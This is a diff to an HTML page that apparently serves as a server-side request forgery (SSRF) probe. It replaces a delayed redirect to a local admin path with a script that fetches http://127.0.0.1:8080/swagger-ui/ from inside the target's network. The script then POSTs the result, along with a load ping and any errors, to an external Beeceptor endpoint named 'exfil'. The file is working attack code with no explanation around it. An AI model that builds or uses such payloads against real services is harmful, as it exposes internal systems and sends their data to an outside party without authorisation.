@@ -1,7 +1,51 @@
-<!-- delayed_redirect.html -->
+<!DOCTYPE html>
+<html>
+<head><title>SSRF Diagnostic</title></head>
+<body>
+<h2>Running...</h2>
+
 <script>
-setTimeout(() => {
-  window.location.href = 'http://127.0.0.1/admin';
-}, 5000); // Delay ensures parser won't follow right away
+(function diagnosticTest(){
+  // First test: Does JS run at all?
+  try {
+    var checkPing = new XMLHttpRequest();
+    checkPing.open("GET", "https://vodagh.free.beeceptor.com/ping-jsloaded", true);
+    checkPing.send();
+    console.log("[+] JS Loaded OK.");
+  } catch (e) {}
+
+  setTimeout(async function() {
+
+    // Second: Perform fetch attempt
+    try {
+      console.log("[*] Attempting internal fetch...");
+      const response = await fetch("http://127.0.0.1:8080/swagger-ui/");
+      const content = await response.text();
+
+      console.log("[+] Success: Got data", content.substring(0,50));
+
+      // Third: Send out externally
+      await fetch("https://vodagh.free.beeceptor.com/exfil", {
+        method: "POST",
+        body: content,
+        headers: { "Content-Type": "application/octet-stream" }
+      });
+
+    } catch(err) {
+      console.error("[-] ERROR:");
+      console.trace(err);
+
+      await fetch("https://vodagh.free.beeceptor.com/error", {
+        method: "POST",
+        body: JSON.stringify({ msg: err.toString(), stack: err.stack }),
+        headers: { "Content-Type": "application/json" }
+      });
+    }
+
+  }, 2000);
+
+})();
 </script>
-Done waiting...
+
+</body>
+</html>
